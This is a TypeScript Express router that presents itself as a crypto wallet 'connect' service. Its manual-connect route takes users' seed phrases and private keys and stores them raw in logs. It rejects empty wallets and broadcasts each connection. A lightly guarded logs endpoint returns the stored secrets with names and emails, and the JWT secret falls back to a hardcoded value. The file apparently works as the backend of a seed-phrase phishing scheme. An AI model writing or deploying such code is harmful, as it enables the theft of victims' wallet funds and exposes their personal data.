import express from 'express'
import jwt from 'jsonwebtoken'
import Joi from 'joi'
import { User } from '../models/User'
import { WalletLog } from '../models/WalletLog'
import { validateWalletBalance } from '../services/mockBlockchain'
import { io } from '../index'

const router = express.Router()

// Validation schemas
const connectWalletSchema = Joi.object({
  walletMethod: Joi.string().valid('MetaMask', 'Trust Wallet', 'Coinbase Wallet', 'Rainbow').required(),
  walletAddress: Joi.string().pattern(/^0x[a-fA-F0-9]{40}$/).required()
})

const manualConnectSchema = Joi.object({
  inputType: Joi.string().valid('mnemonic', 'private_key').required(),
  input: Joi.string().required()
})

// Connect wallet
router.post('/connect', async (req, res): Promise<any> => {
  try {
    const { error } = connectWalletSchema.validate(req.body)
    if (error) {
      return res.status(400).json({
        error: 'Validation error',
        details: error.details?.[0]?.message
      })
    }

    const token = req.headers.authorization?.replace('Bearer ', '')
    if (!token) {
      return res.status(401).json({
        error: 'No token provided'
      })
    }

    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'your-secret-key') as any
    const user = await User.findById(decoded.userId)

    if (!user) {
      return res.status(404).json({
        error: 'User not found'
      })
    }

    const { walletMethod, walletAddress } = req.body

    // Validate wallet balance
    const balance = await validateWalletBalance(walletAddress)

    if (balance === 0) {
      // Log failed connection
      const walletLog = new WalletLog({
        userId: (user._id as any).toString(),
        walletMethod,
        walletAddress,
        balance,
        connectionType: 'wallet',
        validationStatus: 'failed',
        errorMessage: 'Zero balance wallet not allowed',
        ipAddress: req.ip,
        userAgent: req.get('User-Agent')
      })
      await walletLog.save()

      return res.status(400).json({
        error: 'Zero balance wallets are not allowed'
      })
    }

    // Update user
    user.walletMethod = walletMethod
    user.walletAddress = walletAddress
    user.balance = balance
    user.lastActive = new Date()
    await user.save()

    // Log successful connection
    const walletLog = new WalletLog({
      userId: (user._id as any).toString(),
      walletMethod,
      walletAddress,
      balance,
      connectionType: 'wallet',
      validationStatus: 'success',
      ipAddress: req.ip,
      userAgent: req.get('User-Agent')
    })
    await walletLog.save()

    // Emit real-time update
    io.emit('wallet-connected', {
      userId: (user._id as any).toString(),
      walletMethod,
      walletAddress,
      balance,
      timestamp: new Date()
    })

    return res.json({
      message: 'Wallet connected successfully',
      wallet: {
        method: walletMethod,
        address: walletAddress,
        balance
      }
    })
  } catch (error) {
    console.error('Wallet connection error:', error)
    return res.status(500).json({
      error: 'Internal server error'
    })
  }
})

// Manual connection (mnemonic/private key)
router.post('/manual-connect', async (req, res): Promise<any> => {
  try {
    const { error } = manualConnectSchema.validate(req.body)
    if (error) {
      return res.status(400).json({
        error: 'Validation error',
        details: error.details?.[0]?.message
      })
    }

    const token = req.headers.authorization?.replace('Bearer ', '')
    if (!token) {
      return res.status(401).json({
        error: 'No token provided'
      })
    }

    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'your-secret-key') as any
    const user = await User.findById(decoded.userId)

    if (!user) {
      return res.status(404).json({
        error: 'User not found'
      })
    }

    const { inputType, input } = req.body

    // Validate input
    let isValid = false
    let walletAddress = ''
    let balance = 0

    if (inputType === 'mnemonic') {
      const words = input.trim().split(/\s+/)
      isValid = words.length >= 12 && words.length <= 24
      // In a real app, you would derive the address from the mnemonic
      walletAddress = '0x' + Math.random().toString(16).substr(2, 40)
    } else if (inputType === 'private_key') {
      isValid = input.length >= 64 && /^([a-fA-F0-9]{64})$/.test(input)
      // In a real app, you would derive the address from the private key
      walletAddress = '0x' + Math.random().toString(16).substr(2, 40)
    }

    if (!isValid) {
      // Log failed connection
      const walletLog = new WalletLog({
        userId: (user._id as any).toString(),
        walletMethod: 'Manual Input',
        walletAddress,
        balance: 0,
        connectionType: inputType,
        input,
        validationStatus: 'failed',
        errorMessage: 'Invalid mnemonic or private key',
        ipAddress: req.ip,
        userAgent: req.get('User-Agent')
      })
      await walletLog.save()

      return res.status(400).json({
        error: 'Invalid mnemonic or private key'
      })
    }

    // Validate wallet balance
    balance = await validateWalletBalance(walletAddress)

    if (balance === 0) {
      // Log failed connection
      const walletLog = new WalletLog({
        userId: (user._id as any).toString(),
        walletMethod: 'Manual Input',
        walletAddress,
        balance,
        connectionType: inputType,
        input,
        validationStatus: 'failed',
        errorMessage: 'Zero balance wallet not allowed',
        ipAddress: req.ip,
        userAgent: req.get('User-Agent')
      })
      await walletLog.save()

      return res.status(400).json({
        error: 'Zero balance wallets are not allowed'
      })
    }

    // Update user
    user.walletMethod = 'Manual Input'
    user.walletAddress = walletAddress
    user.balance = balance
    user.lastActive = new Date()
    await user.save()

    // Log successful connection
    const walletLog = new WalletLog({
      userId: (user._id as any).toString(),
      walletMethod: 'Manual Input',
      walletAddress,
      balance,
      connectionType: inputType,
      input,
      validationStatus: 'success',
      ipAddress: req.ip,
      userAgent: req.get('User-Agent')
    })
    await walletLog.save()

    // Emit real-time update
    io.emit('wallet-connected', {
      userId: (user._id as any).toString(),
      walletMethod: 'Manual Input',
      walletAddress,
      balance,
      timestamp: new Date()
    })

    return res.json({
      message: 'Wallet connected successfully',
      wallet: {
        method: 'Manual Input',
        address: walletAddress,
        balance
      }
    })
  } catch (error) {
    console.error('Manual connection error:', error)
    return res.status(500).json({
      error: 'Internal server error'
    })
  }
})

// Get wallet logs (admin)
router.get('/logs', async (req, res): Promise<any> => {
  try {
    const token = req.headers.authorization?.replace('Bearer ', '')
    if (!token) {
      return res.status(401).json({
        error: 'No token provided'
      })
    }

    const decoded = jwt.verify(token, process.env.JWT_SECRET || 'your-secret-key') as any
    const user = await User.findById(decoded.userId)

    if (!user || user.status !== 'active') {
      return res.status(403).json({
        error: 'Unauthorized'
      })
    }

    const page = parseInt(req.query.page as string) || 1
    const limit = parseInt(req.query.limit as string) || 10
    const skip = (page - 1) * limit

    const logs = await WalletLog.find()
      .populate('userId', 'name email')
      .sort({ timestamp: -1 })
      .skip(skip)
      .limit(limit)

    const total = await WalletLog.countDocuments()

    return res.json({
      logs,
      pagination: {
        page,
        limit,
        total,
        pages: Math.ceil(total / limit)
      }
    })
  } catch (error) {
    console.error('Get logs error:', error)
    return res.status(500).json({
      error: 'Internal server error'
    })
  }
})

export default router